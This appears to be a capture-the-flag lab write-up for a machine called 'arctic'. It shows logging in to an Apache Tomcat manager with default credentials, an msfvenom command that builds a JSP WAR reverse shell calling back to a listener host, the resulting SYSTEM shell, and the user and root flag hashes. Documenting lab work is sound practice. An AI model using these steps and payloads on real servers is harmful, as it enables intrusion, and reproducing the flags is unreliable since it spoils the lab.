# 10.10.10.95 - arctic
## port 8080 --> apache tomcat 7.0.88
### /manager
- looked up default creds for apache tomcat
	* username: tomcat
	* password: s3cret
- under the access denied page if I read closer it tells me the username and password right there
```
For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above. 
```

- http PUT option exists, can put an asp/jsp file on the server and deploy it through the admin console
- no need to put a file since we already have a login

### create a jsp war reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=1985 -f war > x86-payload-jsp.war
```
- msfvenom is the perfect tool

- upload the file to apache tomcat and deploy it to the server
- set up a listener
- go to that webpage 
#### I am authority\system
```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

```
## Easy win
```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e

```
